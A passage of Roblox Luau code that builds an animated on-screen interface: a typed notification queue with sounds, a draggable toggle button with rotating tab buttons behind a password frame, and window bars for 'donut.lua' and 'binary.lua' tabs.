	"rbxassetid://9120299319", "rbxassetid://9120299508", "rbxassetid://9120299839",
	"rbxassetid://9120299810", "rbxassetid://9120299893", "rbxassetid://9120299710",
}

function playSound(soundId)
	local s = Instance.new("Sound")
	s.SoundId = soundId
	s.Volume = 1
	s.Parent = box["local player"]
	s:Play()
	game:GetService("Debris"):AddItem(s, 3)
end

function updateNotificationPositions()
	local baseY = -50
	local spacing = 17

	for i, notif in ipairs(activeNotifications) do
		local targetY = baseY + (i - 1) * spacing
		local tween = game:GetService("TweenService"):Create(notif, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Position = UDim2.new(0.5, -100, 0, targetY)
		})
		tween:Play()
	end
end

function processNextNotification()
	if #pendingNotifications == 0 then
		isNotifying = false
		return
	end

	isNotifying = true
	local text = table.remove(pendingNotifications, 1)

	local screenGui = box["screen gui"]
	local camera = workspace.CurrentCamera
	local screenWidth = camera.ViewportSize.X
	local screenHeight = camera.ViewportSize.Y

	local startX = (screenWidth - 200) / 2
	local startY = -110

	local label = box["wm"]:Clone()
	label.Text = "[ ]"
	label.ZIndex = notificationZ
	notificationZ += 1
	label.Position = UDim2.new(0, startX, 0, startY)
	label.Parent = screenGui

	playSound("rbxassetid://15675028888")

	table.insert(activeNotifications, label)
	updateNotificationPositions()

	task.wait(0.3)

	task.spawn(function()
		for i = 1, #text do
			label.Text = "[ " .. text:sub(1, i) .. " ]"

			local typeSound = Instance.new("Sound")
			typeSound.SoundId = typingSounds[math.random(1, #typingSounds)]
			typeSound.Volume = 0.6
			typeSound.Name = "canttouchthis"
			typeSound.Parent = box["local player"]
			typeSound:Play()
			game:GetService("Debris"):AddItem(typeSound, 2)

			task.wait(0.03)
		end
	end)

	local typingTime = #text * 0.03
	local holdTime = 1.2
	local totalDuration = typingTime + holdTime

	task.delay(totalDuration + 1.5, function()
		local tweenOut = game:GetService("TweenService"):Create(label, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
			Position = UDim2.new(0.5, -100, 0, -80)
		})
		tweenOut:Play()

		playSound("rbxassetid://15675028888")
		tweenOut.Completed:Wait()

		label:Destroy()
		for i = #activeNotifications, 1, -1 do
			if activeNotifications[i] == label then
				table.remove(activeNotifications, i)
				break
			end
		end

		updateNotificationPositions()
	end)

	task.delay(0.4, processNextNotification)
end

function unablenotify(text)
	if not box["wm"] then return end
	box["wm"].Visible = true
	table.insert(pendingNotifications, text)
	if not isNotifying then
		processNextNotification()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

box["click sound"] = Instance.new"Sound"
box["click sound"].SoundId = "rbxassetid://226892749"
box["click sound"].Parent = box["local player"]
box["click sound"].Name = "canttouchthis"
box["click sound"].Volume = 0.4

box["startup"] = Instance.new"Sound"
box["startup"].SoundId = "rbxassetid://8503529653"
box["startup"].Parent = box["local player"]
box["startup"].Volume = 0
box["startup"].TimePosition = 0

function playclicksound()
	updcols()
	local newSound = box["click sound"]:Clone()
	newSound.Parent = box["click sound"].Parent
	newSound:Play()
	task.spawn(updcols)
	newSound.Ended:Connect(function() newSound:Destroy() end)
	task.spawn(updcols)
end

box["startup"]:Play()
box["startup"]:Stop()
wait(0.1)
box["startup"].Volume = 3.5

-------------------------------------------------------------------------------------------------------------------------------

box["toggle interface visibility button"].Size = UDim2.new(0, 48, 0, 48)
box["toggle interface visibility button"].Position = UDim2.new(0, 0, 10, 0)

box["toggle interface visibility button"].BackgroundColor3 = box["default background color"]

box["toggle interface visibility button"].BorderColor3 = box["default border color"]
box["toggle interface visibility button"].BorderSizePixel = 1

box["toggle interface visibility button"].TextColor3 = box["default border color"]
box["toggle interface visibility button"].Font = Enum.Font.RobotoMono
box["toggle interface visibility button"].TextSize = 20
box["toggle interface visibility button"].TextScaled = false
box["toggle interface visibility button"].Text = ">.<"
box["toggle interface visibility button"].TextXAlignment = Enum.TextXAlignment.Center
box["toggle interface visibility button"].TextYAlignment = Enum.TextYAlignment.Center

box["toggle interface visibility button text padding"] = Instance.new("UIPadding")
box["toggle interface visibility button text padding"].PaddingTop = UDim.new(0, 0)
box["toggle interface visibility button text padding"].Parent = box["toggle interface visibility button"]

box["toggle interface visibility button"].Parent = box["screen gui"]
box["toggle interface visibility button"].ZIndex = 6969

-------------------------------------------------------------------------------------------------------------------------------

function movebutton()
	updcols()
	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X

	local buttonWidth = 48

	local centerX = (screenWidth - buttonWidth) / 2
	local topMargin = 20
	local centerY = topMargin

	box["toggle interface visibility button"].Position = UDim2.new(0, centerX, 0, centerY - 150)

	local offsetY = 150
	local targetPosition = UDim2.new(0, centerX, 0, centerY - offsetY)

	local tweenInfoUp = TweenInfo.new(0, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)

	local tweenUp = box["tween service"]:Create(box["toggle interface visibility button"], tweenInfoUp, {Position = targetPosition})

	local function moveButtonBack()
		local tweenInfoDown = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)

		local tweenDown = box["tween service"]:Create(box["toggle interface visibility button"], tweenInfoDown, {Position = UDim2.new(0, centerX, 0, centerY)})

		tweenDown:Play()
	end

	box["toggle interface visibility button"].Visible = true
	tweenUp:Play()
	spawn(function() box["startup"]:Play() end)

	tweenUp.Completed:Wait()
	moveButtonBack()
end

function dragbutton()
	local frame = box["toggle interface visibility button"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragbutton()

-------------------------------------------------------------------------------------------------------------------------------

local minimized = false
local canpress = true
local lastVisibleFrame = "main frame 1"
local canpress2 = true

local rotationCycle = {
	["small button top"] = "small button right",
	["small button right"] = "small button bottom",
	["small button bottom"] = "small button left",
	["small button left"] = "small button top"
}

local counterRotationCycle = {
	["small button top"] = "small button left",
	["small button left"] = "small button bottom", 
	["small button bottom"] = "small button right",
	["small button right"] = "small button top"
}

local buttonConfigs = {
	["small button left"] = {
		text = "/]",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if box["unlocked"] == true then
					box["password frame"].Visible = false
				else
					box["password frame"].Visible = true
				end
				box["main frame 1"].Visible = false
				box["main frame 2"].Visible = false
				box["main frame 3"].Visible = false
				box["main frame 4"].Visible = true
				lastVisibleFrame = "main frame 4"
				task.spawn(updcols)
			end
		end
	},
	["small button right"] = {
		text = "(i)",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if box["unlocked"] == true then
					box["password frame"].Visible = false
				else
					box["password frame"].Visible = true
				end
				box["main frame 1"].Visible = false
				box["main frame 2"].Visible = true
				box["main frame 3"].Visible = false
				box["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 2"
				task.spawn(updcols)
			end
		end
	},
	["small button top"] = {
		text = ">_",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if box["unlocked"] == true then
					box["password frame"].Visible = false
				else
					box["password frame"].Visible = true
				end
				box["main frame 1"].Visible = true
				box["main frame 2"].Visible = false
				box["main frame 3"].Visible = false
				box["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 1"
				task.spawn(updcols)
			end
		end
	},
	["small button bottom"] = {
		text = "<+>",
		onClick = function()
			if not canpress2 then return end
			playclicksound()
			if minimized == false then
				if box["unlocked"] == true then
					box["password frame"].Visible = false
				else
					box["password frame"].Visible = true
				end
				box["main frame 1"].Visible = false
				box["main frame 2"].Visible = false
				box["main frame 3"].Visible = true
				box["main frame 4"].Visible = false
				lastVisibleFrame = "main frame 3"
				task.spawn(updcols)
			end
		end
	}
}

local originalPositions = {}

local randomRotations = {}

function getRandomRotation()
	return math.random(180, 180)
end

for name, config in pairs(buttonConfigs) do
	box[name] = Instance.new("TextButton")
	local smallButton = box[name]
	smallButton.Size = UDim2.new(0, 30, 0, 30)
	smallButton.Position = UDim2.new(0.5, -15, 0.5, -15)
	smallButton.BackgroundColor3 = box["default background color"]
	smallButton.BorderColor3 = box["default border color"]
	smallButton.BorderSizePixel = 1
	smallButton.Text = config.text
	smallButton.TextColor3 = box["default border color"]
	smallButton.Font = Enum.Font.RobotoMono
	smallButton.TextSize = 16
	smallButton.TextScaled = false
	smallButton.TextXAlignment = Enum.TextXAlignment.Center
	smallButton.TextYAlignment = Enum.TextYAlignment.Center
	smallButton.ZIndex = 6968
	smallButton.Parent = box["toggle interface visibility button"]
	smallButton.Visible = false

	originalPositions[name] = smallButton.Position

	randomRotations[name] = getRandomRotation()
	smallButton.Rotation = randomRotations[name]

	smallButton.MouseButton1Click:Connect(function()
		config.onClick()
	end)
end

function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
	local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
	local tween = box["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
	tween:Play()
	return tween
end

local initialOffsets = {
	["small button left"] = UDim2.new(0, -10, 0, 0),
	["small button right"] = UDim2.new(0, 10, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -10),
	["small button bottom"] = UDim2.new(0, 0, 0, 10)
}

local showOffsets = {
	["small button left"] = UDim2.new(0, -50, 0, 0),
	["small button right"] = UDim2.new(0, 50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, -50),
	["small button bottom"] = UDim2.new(0, 0, 0, 50)
}

local hideOffsets = {
	["small button left"] = UDim2.new(0, 50, 0, 0),
	["small button right"] = UDim2.new(0, -50, 0, 0),
	["small button top"] = UDim2.new(0, 0, 0, 50),
	["small button bottom"] = UDim2.new(0, 0, 0, -50)
}

box["toggle interface visibility button"].MouseButton1Click:Connect(function()
	spawn(updcols)

	if not canpress then return end
	if not canpress2 then return end
	playclicksound()

	toggleLoop(false)
	local topBar = box["top bar"]
	local blockAll = box["block all"]
	local screenGui = box["screen gui"]

	if topBar.Visible == false then
		canpress = false
		canpress2 = false

		blockAll.Parent = screenGui
		blockAll.Position = topBar.Position
		blockAll.Size = UDim2.new(0, 401, 0, 0)
		blockAll.BackgroundColor3 = box["default background color"]
		blockAll.BorderColor3 = box["default border color"]
		blockAll.BorderSizePixel = 1
		blockAll.ZIndex = 58
		blockAll.Visible = true
		blockAll.BackgroundTransparency = 0

		spawn(function()
			if minimized == true then
				expandTween = box["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 26)
				})
			else
				expandTween = box["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
					Size = UDim2.new(0, 401, 0, 276)
				})
			end
			expandTween:Play()
			expandTween.Completed:Wait()

			topBar.Visible = true

			fadeTween = box["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 1
			})
			fadeTween:Play()
			fadeTween.Completed:Wait()

			blockAll.Visible = false
			if scanning == false then
				box["toggle interface visibility button"].Text = ">.<"
				toggleLoop(true)
			end
			canpress = true
			canpress2 = true
		end)

		spawn(function()
			if not box["unlocked"] then return end
			if minimized then return end
			local tweens = {}
			for name, offset in pairs(showOffsets) do
				local smallButton = box[name]
				smallButton.Visible = true
				local targetPosition = originalPositions[name] + offset
				local targetRotation = 0
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	else
		canpress = false
		canpress2 = false

		spawn(function()
			blockAll.Parent = screenGui
			blockAll.Position = topBar.Position
			if minimized == true then
				blockAll.Size = UDim2.new(0, 401, 0, 26)
			else
				blockAll.Size = UDim2.new(0, 401, 0, 276)
			end
			blockAll.BackgroundTransparency = 1
			blockAll.Visible = true

			local fadeInTween = box["tween service"]:Create(blockAll, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				BackgroundTransparency = 0
			})
			fadeInTween:Play()
			fadeInTween.Completed:Wait()

			topBar.Visible = false

			local shrinkTween = box["tween service"]:Create(blockAll, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
				Size = UDim2.new(0, 401, 0, 0)
			})
			shrinkTween:Play()
			shrinkTween.Completed:Wait()

			blockAll.Visible = false
			canpress = true
			canpress2 = true
			if scanning == false then
				box["toggle interface visibility button"].Text = "o.o"
				toggleLoop(true)
			end
		end)

		spawn(function()
			if not box["unlocked"] then return end
			if minimized then return end
			for name, _ in pairs(showOffsets) do
				randomRotations[name] = getRandomRotation()
			end

			local tweens = {}
			for name, _ in pairs(showOffsets) do
				local smallButton = box[name]
				local targetPosition = originalPositions[name]
				local targetRotation = randomRotations[name]
				local tween = tweenPositionAndRotation(smallButton, targetPosition, targetRotation, 0.5)
				tween.Completed:Connect(function()
					smallButton.Visible = false
				end)
				table.insert(tweens, tween)
			end
			for _, tween in ipairs(tweens) do
				tween.Completed:Wait()
			end
		end)
	end
end)

box["block all"]:GetPropertyChangedSignal("Visible"):Connect(function()
	if box["block all"].Visible then
		box["block all"].Position = box["top bar"].Position
	end
end)

function rotateButtons(direction)
	if not canpress2 then return end
	if not box["top bar"].Visible then return end

	function tweenPositionAndRotation(object, targetPosition, targetRotation, duration)
		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = box["tween service"]:Create(object, tweenInfo, {Position = targetPosition, Rotation = targetRotation})
		tween:Play()
		return tween
	end

	canpress2 = false

	local cycle = (direction == "counter") and counterRotationCycle or rotationCycle

	local targetPositions = {}
	for name, targetName in pairs(cycle) do
		targetPositions[name] = originalPositions[targetName] + showOffsets[targetName]
	end

	local tweens = {}
	for name, targetName in pairs(cycle) do
		local button = box[name]
		local tween = tweenPositionAndRotation(button, targetPositions[name], 0, 0.5)
		table.insert(tweens, tween)
	end

	local newOriginalPositions = {}
	local newShowOffsets = {}
	for name, targetName in pairs(cycle) do
		newOriginalPositions[name] = originalPositions[targetName]
		newShowOffsets[name] = showOffsets[targetName]
	end

	originalPositions = newOriginalPositions
	showOffsets = newShowOffsets

	canpress2 = true

	for _, tween in ipairs(tweens) do
		tween.Completed:Wait()
	end
end

box["user input service"].InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.RightBracket then
			if box["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("clockwise")
		elseif input.KeyCode == Enum.KeyCode.LeftBracket then
			if box["toggle interface visibility button"].Text == ">.<" then return end
			if canpress == false then return end
			coroutine.wrap(rotateButtons)("counter")
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

box["top bar"].Size = UDim2.new(0, 401, 0, 26)
box["top bar"].BackgroundColor3 = box["default background color"]

box["top bar"].BorderColor3 = box["default border color"]
box["top bar"].BorderSizePixel = 1

box["top bar"].TextColor3 = box["default border color"]
box["top bar"].Font = Enum.Font.RobotoMono
box["top bar"].TextSize = 15
box["top bar"].TextScaled = false
box["top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["top bar text padding"] = Instance.new("UIPadding")
box["top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["top bar text padding"].PaddingRight = UDim.new(0, 0)
box["top bar text padding"].Parent = box["top bar"]

box["top bar"].Parent = box["screen gui"]
box["top bar"].ZIndex = 19
box["top bar"].Visible = false

box["sexy"].Size = UDim2.new(0, 21, 0, 23)
box["sexy"].Position = UDim2.new(0, 3, 0, 3)
box["sexy"].Image = "rbxassetid://91985523170507"
box["sexy"].BackgroundTransparency = 1
box["sexy"].BorderSizePixel = 0
box["sexy"].Parent = box["top bar"]
box["sexy"].ZIndex = 20
box["sexy"].Visible = true

function dragtopbar()
	local frame = box["top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab top bar"].Size = UDim2.new(0, 276, 0, 26)

box["donut tab top bar"].BackgroundColor3 = box["default background color"]

box["donut tab top bar"].BorderColor3 = box["default border color"]
box["donut tab top bar"].BorderSizePixel = 1

box["donut tab top bar"].TextColor3 = box["default border color"]
box["donut tab top bar"].Font = Enum.Font.RobotoMono
box["donut tab top bar"].TextSize = 15
box["donut tab top bar"].TextScaled = false
box["donut tab top bar"].Text = " donut.lua o.o"
box["donut tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["donut tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["donut top bar text padding"] = Instance.new("UIPadding")
box["donut top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["donut top bar text padding"].PaddingRight = UDim.new(0, 0)
box["donut top bar text padding"].Parent = box["donut tab top bar"]

box["donut tab top bar"].Parent = box["screen gui"]
box["donut tab top bar"].ZIndex = 110
box["donut tab top bar"].Visible = false

function dragdonuttabtopbar()
	local frame = box["donut tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragdonuttabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["donut tab top bar close button"].Position = UDim2.new(0, 254, 0, 4.7)

box["donut tab top bar close button"].BackgroundColor3 = box["default background color"]

box["donut tab top bar close button"].BorderColor3 = box["default border color"]
box["donut tab top bar close button"].BorderSizePixel = 1

box["donut tab top bar close button"].TextColor3 = box["default border color"]
box["donut tab top bar close button"].Font = Enum.Font.RobotoMono
box["donut tab top bar close button"].TextSize = 16
box["donut tab top bar close button"].TextScaled = false
box["donut tab top bar close button"].Text = "X"
box["donut tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["donut tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["donut tab top bar close button"].Parent = box["donut tab top bar"]
box["donut tab top bar close button"].ZIndex = 111

box["donut tab top bar close button text padding"] = Instance.new("UIPadding")
box["donut tab top bar close button text padding"].PaddingTop = UDim.new(0, -1)
box["donut tab top bar close button text padding"].Parent = box["donut tab top bar close button"]

box["donut tab top bar close button"].MouseButton1Click:Connect(function()
	if not donuttabcanminimize then return end
	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end
	donuttabopen = false
	donuttabminimized = false
	playclicksound()
	box["donut tab top bar"].Visible = false
	repos(box["donut tab top bar"], 0, 276, 260 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab top bar minimize button"].Size = UDim2.new(0, 18, 0, 18)
box["donut tab top bar minimize button"].Position = UDim2.new(0, 230, 0, 4.7)

box["donut tab top bar minimize button"].BackgroundColor3 = box["default background color"]

box["donut tab top bar minimize button"].BorderColor3 = box["default border color"]
box["donut tab top bar minimize button"].BorderSizePixel = 1

box["donut tab top bar minimize button"].TextColor3 = box["default border color"]
box["donut tab top bar minimize button"].Font = Enum.Font.RobotoMono
box["donut tab top bar minimize button"].TextSize = 16
box["donut tab top bar minimize button"].TextScaled = false
box["donut tab top bar minimize button"].Visible = true
box["donut tab top bar minimize button"].Text = "-"
box["donut tab top bar minimize button"].TextXAlignment = Enum.TextXAlignment.Center
box["donut tab top bar minimize button"].TextYAlignment = Enum.TextYAlignment.Center

box["donut tab top bar minimize button"].Parent = box["donut tab top bar"]
box["donut tab top bar minimize button"].ZIndex = 111

box["donut tab top bar minimize button text padding"] = Instance.new("UIPadding")
box["donut tab top bar minimize button text padding"].PaddingTop = UDim.new(0, -2)
box["donut tab top bar minimize button text padding"].Parent = box["donut tab top bar minimize button"]

donuttabminimized = false
donuttabcanminimize = true

box["donut tab top bar minimize button"].MouseButton1Click:Connect(function()
	if not donuttabcanminimize then return end
	spawn(playclicksound)
	donuttabcanminimize = false

	donuttabminimized = not donuttabminimized

	if donuttabminimized then
		box["donut tab top bar minimize button"].Text = "+"
		box["donut tab block main frame"].Visible = true

		local fadeTween = fade(box["donut tab block main frame"], 0, 0.2)
		fadeTween.Completed:Wait()
		box["donut tab main frame 1"].Visible = false

		local tween = tweenSizePosition(
			box["donut tab block main frame"],
			UDim2.new(0, 276, 0, 0),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()

		donuttabreallyminimized = true
		box["donut tab block main frame"].Visible = false
		updcols()
	else
		box["donut tab top bar minimize button"].Text = "-"
		box["donut tab block main frame"].Visible = true

		local tween = tweenSizePosition(
			box["donut tab block main frame"],
			UDim2.new(0, 276, 0, 233),
			UDim2.new(0, 0, 1, 1),
			0.5
		)
		tween.Completed:Wait()
		box["donut tab main frame 1"].Visible = true

		local fadeTween = fade(box["donut tab block main frame"], 1, 0.2)
		fadeTween.Completed:Wait()

		donuttabreallyminimized = false
		box["donut tab block main frame"].Visible = false
		updcols()
	end

	donuttabcanminimize = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab top bar reposition button"].Size = UDim2.new(0, 18, 0, 18)
box["donut tab top bar reposition button"].Position = UDim2.new(0, 206, 0, 4.7)

box["donut tab top bar reposition button"].BackgroundColor3 = box["default background color"]

box["donut tab top bar reposition button"].BorderColor3 = box["default border color"]
box["donut tab top bar reposition button"].BorderSizePixel = 1

box["donut tab top bar reposition button"].TextColor3 = box["default border color"]
box["donut tab top bar reposition button"].Font = Enum.Font.RobotoMono
box["donut tab top bar reposition button"].TextSize = 16
box["donut tab top bar reposition button"].TextScaled = false
box["donut tab top bar reposition button"].Text = "R"
box["donut tab top bar reposition button"].TextXAlignment = Enum.TextXAlignment.Center
box["donut tab top bar reposition button"].TextYAlignment = Enum.TextYAlignment.Center

box["donut tab top bar reposition button"].Parent = box["donut tab top bar"]
box["donut tab top bar reposition button"].ZIndex = 111

box["donut tab top bar reposition button text padding"] = Instance.new("UIPadding")
box["donut tab top bar reposition button text padding"].PaddingTop = UDim.new(0, -1)
box["donut tab top bar reposition button text padding"].Parent = box["donut tab top bar reposition button"]

box["donut tab top bar reposition button"].MouseButton1Click:Connect(function()
	playclicksound()
	repos(box["donut tab top bar"], 0.5, 276, 260 + 26)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab main frame 1"].Size = UDim2.new(0, 276, 0, 234)
box["donut tab main frame 1"].Position = UDim2.new(0, 0, 1, 0)

box["donut tab main frame 1"].BackgroundColor3 = box["default background color"]

box["donut tab main frame 1"].BorderColor3 = box["default border color"]
box["donut tab main frame 1"].BorderSizePixel = 1

box["donut tab main frame 1"].Parent = box["donut tab top bar"]
box["donut tab main frame 1"].ZIndex = 109

box["donut"].Size = UDim2.new(0, 268, 0, 225)
box["donut"].Position = UDim2.new(0, 4, 0, 5)

box["donut"].BackgroundColor3 = box["default background color"]

box["donut"].BorderColor3 = box["default border color"]
box["donut"].BorderSizePixel = 1

box["donut"].Parent = box["donut tab main frame 1"]
box["donut"].ZIndex = 110

box["donut"].Font = Enum.Font.RobotoMono
box["donut"].TextColor3 = Color3.new(1, 1, 1)
box["donut"].TextSize = 9
box["donut"].TextWrapped = true
box["donut"].TextXAlignment = Enum.TextXAlignment.Center
box["donut"].TextYAlignment = Enum.TextYAlignment.Center
box["donut"].Text = ""
box["donut"].Name = "stay"

if box["is mobile?"] then
	box["donut"].TextSize = 7
else
	box["donut"].TextSize = 9
end

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
box["donut tab block main frame"].Position = UDim2.new(0, 0, 1, 1)

box["donut tab block main frame"].BackgroundColor3 = box["default background color"]

box["donut tab block main frame"].BorderColor3 = box["default border color"]
box["donut tab block main frame"].BorderSizePixel = 1
box["donut tab block main frame"].BackgroundTransparency = 1

box["donut tab block main frame"].Parent = box["donut tab top bar"]
box["donut tab block main frame"].ZIndex = 110
box["donut tab block main frame"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

box["donut tab block all"].Size = UDim2.new(0, 276, 0, 260)
box["donut tab block all"].Position = UDim2.new(0, 0, 0, 0)

box["donut tab block all"].BackgroundColor3 = box["default background color"]

box["donut tab block all"].BorderColor3 = box["default border color"]
box["donut tab block all"].BorderSizePixel = 1
box["donut tab block all"].BackgroundTransparency = 0

box["donut tab block all"].Parent = box["donut tab top bar"]
box["donut tab block all"].ZIndex = 111
box["donut tab block all"].Visible = true

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab top bar"].Size = UDim2.new(0, 246, 0, 26)

box["binary tab top bar"].BackgroundColor3 = box["default background color"]

box["binary tab top bar"].BorderColor3 = box["default border color"]
box["binary tab top bar"].BorderSizePixel = 1

box["binary tab top bar"].TextColor3 = box["default border color"]
box["binary tab top bar"].Font = Enum.Font.RobotoMono
box["binary tab top bar"].TextSize = 15
box["binary tab top bar"].TextScaled = false
box["binary tab top bar"].Text = " binary.lua o.o"
box["binary tab top bar"].TextXAlignment = Enum.TextXAlignment.Left
box["binary tab top bar"].TextYAlignment = Enum.TextYAlignment.Center

box["binary top bar text padding"] = Instance.new("UIPadding")
box["binary top bar text padding"].PaddingLeft = UDim.new(0, 0)
box["binary top bar text padding"].PaddingRight = UDim.new(0, 0)
box["binary top bar text padding"].Parent = box["binary tab top bar"]

box["binary tab top bar"].Parent = box["screen gui"]
box["binary tab top bar"].ZIndex = 113
box["binary tab top bar"].Visible = false

function dragbinarytabtopbar()
	local frame = box["binary tab top bar"]
	local dragToggle 	
	local dragSpeed = 0.25
	local dragStart 	
	local startPos 

	local function updatebuttoninput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		box["tween service"]:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	box["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updatebuttoninput(input)
			end
		end
	end)
end

dragbinarytabtopbar()

-------------------------------------------------------------------------------------------------------------------------------

box["binary tab top bar close button"].Size = UDim2.new(0, 18, 0, 18)
box["binary tab top bar close button"].Position = UDim2.new(0, 224, 0, 4.7)

box["binary tab top bar close button"].BackgroundColor3 = box["default background color"]

box["binary tab top bar close button"].BorderColor3 = box["default border color"]
box["binary tab top bar close button"].BorderSizePixel = 1

box["binary tab top bar close button"].TextColor3 = box["default border color"]
box["binary tab top bar close button"].Font = Enum.Font.RobotoMono
box["binary tab top bar close button"].TextSize = 16
box["binary tab top bar close button"].TextScaled = false
box["binary tab top bar close button"].Text = "X"
box["binary tab top bar close button"].TextXAlignment = Enum.TextXAlignment.Center
box["binary tab top bar close button"].TextYAlignment = Enum.TextYAlignment.Center

box["binary tab top bar close button"].Parent = box["binary tab top bar"]
box["binary tab top bar close button"].ZIndex = 114

box["binary tab top bar close button text padding"] = Instance.new("UIPadding")
